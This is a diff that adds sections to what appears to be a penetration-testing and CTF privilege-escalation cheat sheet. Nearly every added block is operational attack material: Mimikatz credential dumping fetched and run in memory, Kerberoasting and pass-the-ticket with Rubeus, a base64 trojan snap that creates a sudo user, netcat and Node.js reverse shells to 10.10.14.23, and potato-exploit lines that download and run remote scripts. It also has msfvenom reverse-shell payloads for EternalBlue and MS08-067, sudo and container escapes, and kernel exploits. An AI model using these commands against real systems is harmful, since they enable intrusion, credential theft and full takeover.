@@ -437,7 +437,28 @@ done
 
 ### Stegseek
 
+```bash
+# Downloads
+https://github.com/RickdeJager/stegseek
+
+# Commands
+stegseek [stegofile.jpg] [wordlist.txt]
+stegeek a.jpg rockyou.txt
+```
+
 ### Binwalk
+```bash
+# Download/Install
+https://github.com/ReFirmLabs/binwalk
+sudo apt-get install -y binwalk
+
+# Commands
+binwalk --signature firmware.bin
+binwalk -A firmware.bin
+
+# References
+- https://github.com/ReFirmLabs/binwalk/wiki/Usage
+```
 
 ### Crunch
 
@@ -563,9 +584,35 @@ sshuttle -vr sshuser@10.10.10.10 192.168.0.1/16
 
 ### Pwsh
 
+```bash
+# Downloads/Install
+https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux?view=powershell-7.1
+```
+
 ### Invoke-Mimikatz.ps1
 
+```bash
+# Downloads
+https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
+
+# Commands
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
+Invoke-Mimikatz -DumpCreds
+```
+
 ### Rubeus
+```bash
+# Download
+https://github.com/GhostPack/Rubeus
+
+# Commands
+.\Rubeus.exe asreproast  /format:hashcat /outfile:ou.txt
+.\Rubeus.exe kerberoast /outfile:ou.txt
+.\Rubeus dump
+	* [IO.File]::WriteAllBytes("C:\users\administrator\downloads\ticket.kirbi", [Convert]::FromBase64String("<base64 longer>"))
+	* .\Rubeus.exe ptt /ticket:ticket.kirbi
+	* .\PsExec64.exe -accepteula \\bank.local -u nikk cmd 
+```
 
 ### Covenant
 
@@ -661,17 +708,124 @@ https://github.com/pwntester/ysoserial.net
 
 ### LXD
 
+```bash
+#If No Internet Access
+1. git clone  https://github.com/saghul/lxd-alpine-builder.git
+2. cd lxd-alpine-builder
+3. ./build-alpine
+4. Upload file.tar.gz into target machine
+5. lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
+6. lxc init myimage ignite -c security.privileged=true
+7. lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+8. lxc start ignite
+9. lxc exec ignite /bin/sh
+```
+
 ### Node
+
+```bash
+# Sudo
+sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
+```
 
 ### Cat
 
+```bash
+# Sudo
+sudo /bin/cat /opt/games/../../../etc/passwd
+```
+
 ### Snap
+
+```bash
+# Sudo
+# Malicious snap to create dirty_sock:dirty_sock
+
+## python3 snapmal.py
+import base64
+
+TROJAN_SNAP = ('''
+aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
+/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
+ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
+TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
+T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
+Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
+ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
+ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
+L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
+b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
+rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
+rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
+AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
+XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
+RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
+AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''+ 'A' * 4256 + '==')
+
+blob = base64.b64decode(TROJAN_SNAP)
+file = open("sample.snap", "wb")
+file.write(blob)
+file.close()
+
+# Run
+sudo snap install --dangerous --devmode exploit.snap
+
+#another method sudo install
+[Sudo snap install]
+COMMAND="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.23 443 >/tmp/f"
+cd $(mktemp -d)
+mkdir -p meta/hooks
+printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
+chmod +x meta/hooks/install
+fpm -n xxxx -s dir -t snap -a all meta
+
+# Commands
+sudo /usr/bin/snap install test.snap --dangerous --devmode
+```
 
 ### Msfconsole
 
+```bash
+# Sudo
+sudo msfconsole -x bash
+```
+
 ### Docker
 
+```bash
+# Group docker
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
 ### Initctl
+
+```bash
+# Save as test.conf in /etc/init/testconf
+description "Test node.js server"
+author      "root"
+
+script
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /tmp/reverse.js
+end script
+
+# Nodejs - save as /tmp/reverse.js
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1337, "10.10.14.23", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+# Commands
+sudo /sbin/initctl stop test
+sudo /sbin/initctl start test
+```
 
 ### WildCard (*)
 
@@ -724,37 +878,236 @@ https://github.com/opsxcq/exploit-CVE-2014-6271
 
 ### MS-17-010
 
+```bash
+# Commands
+git clone https://github.com/helviojunior/MS17-010.git
+msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe > eternalblue.exe
+nc -nlvp 443
+python send_and_execute.py 10.10.10.4 /<fullpath>/eternalblue.exe
+
+# Change username if needed for authentication
+
+# References
+- https://github.com/helviojunior/MS17-010.git
+```
+
 ### MS08-067
+
+```bash
+# Commands
+msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -a x86 --platform windows
+# Replace the b" -> "
+nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.10.10.4 # Check versio
+# Replace the shellcode inside the exploit script
+# Ensure the payload total would be 410
+# "\x90" * (410 - len(shellcode))
+
+# Run Exploit
+# 7 -> Windows XP SP3 English (AlwaysOn NX)
+python exploit.py 10.10.10.4 7 445   
+
+# References
+- https://www.exploit-db.com/exploits/40279
+```
 
 ### SeImpersonatePrivilege
 
+```bash
+# Tecnique 1
+wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
+PrintSpoofer.exe -i -c cmd
+
+# Technique 2
+##First
+git clone https://github.com/CCob/SweetPotato.git
+run .sln and compile as .exe (Make sure off anti-virus first)
+SweetPotato.exe -p cmd.exe
+
+##Second
+git clone https://github.com/uknowsec/SweetPotato.git
+run .sln and compile as .exe (Make sure off anti-virus first)
+SweetPotato.exe -a "whoami"
+
+# Technique 3
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
+```
+
 ### MS11-046
+
+```bash
+# Save it in one file
+exploit.c
+
+# Compile
+sudo apt-get update
+sudo apt-get install mingw-w64
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
+
+# Run
+exploit.exe
+
+# References
+- https://www.exploit-db.com/exploits/40564
+```
 
 ### MS16-098
 
+```bash
+# Download
+wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+
+# Usage
+exploit.exe
+
+# References
+https://www.exploit-db.com/exploits/41020
+```
+
 ### MS10-059
+
+```bash
+# Download 
+wget https://github.com/egre55/windows-kernel-exploits/raw/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe
+
+# Usage (Reverse Shell)
+exploit.exe 10.10.14.16 9002
+
+# References
+```
 
 ### Token Kidnapping (Windows 2003)
 
+```bash
+# Download
+wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
+
+# Usage
+churrasco.exe "whoami"
+
+# References
+https://www.exploit-db.com/exploits/6705
+```
+
 ### DirtySock
+
+```bash
+# Download
+wget https://github.com/initstring/dirty_sock/archive/master.zip
+
+# Usage
+unzip
+cd dirty_sock
+python3 dirty_sockv2.py
+
+# Then
+su dirty_sock
+	* dirty_sock
+```
 
 ### ChrootKit
 
+```bash
+- If you found chrootkit run in background then you can try this
+
+# Steps
+echo "cp /bin/bash /tmp/bash;chmod 4777 /tmp/bash" > /tmp/update
+/tmp/bash -p
+```
+
 ### IIS 6.0 (CVE-2017-7269)
+
+```bash
+# Download
+wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell -O exploit.py
+
+# Usage
+python exploit.py 10.10.10.14 80 10.10.14.23 443
+```
 
 ### AlwaysInstall Elevated
 
+```bash
+# Payload
+msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=9002 –f  msi > install.msi
+msfvenom -p windows/x64/shell_reverse_tcp lhost=tun0 lport=9002 –f  msi > install.msi
+msiexec /quiet /qn /i  install.msi
+```
+
 ### Ptrace
+
+```bash
+# Download
+wget https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
+
+# Compile
+gcc -Wall --std=gnu99 -s poc.c -o ptrace_traceme_root
+
+# Usage
+./ptrace_traceme_root
+```
 
 ### FTP Backdoor Command Execution
 
+```bash
+# Download
+wget https://raw.githubusercontent.com/ahervias77/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py
+
+# Usage
+└─▶ python3 vsftpd_234_exploit.py 10.150.150.12 21 whoami
+[*] Attempting to trigger backdoor...
+[+] Triggered backdoor
+[*] Attempting to connect to backdoor...
+[+] Connected to backdoor on 10.150.150.12:6200
+[+] Response:
+root
+```
+
 ### Shadow Writable
+
+```bash
+- Generate weak password in http://sha512crypt.pw/
+
+# Example - password
+$6$Zwdp3uo2Hg1HUvlc$wYEAwd5o9C5xQ1yX97izpRp/IhH4Dk1BzgprmQmK2P9/GnYTCIxzpF63/jelcdi6FjSIXxbirfn8o2gR1rHZq0
+
+- replace in root hash
+
+# Commands
+su root
+```
 
 ### OpenSMPTD < 6 (Local Privesc)
 
+```bash
+# Save as exploit.pl
+https://www.exploit-db.com/exploits/48051
+
+# Usage
+perl exploit.pl LPE #local
+perl exploit.pl RCE 10.0.0.162 10.0.0.24 example.org
+```
+
 ### PHP Info + LFI
 
+```bash
+# Downloads
+https://raw.githubusercontent.com/VineshChauhan24/LFI-phpinfo-RCE/master/exploit.py
+
+# References
+
+```
+
 ### DirtyCow
+
+```bash
+# Download
+
+# Usage
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty password
+```
 
 ### Ubuntu
 
@@ -933,4 +1286,4 @@ https://www.sourcecodester.com/php/12306/voting-system-using-php.html
 # References
 - https://github.com/swisskyrepo/PayloadsAllTheThings
 - https://book.hacktricks.xyz/
-
+- https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
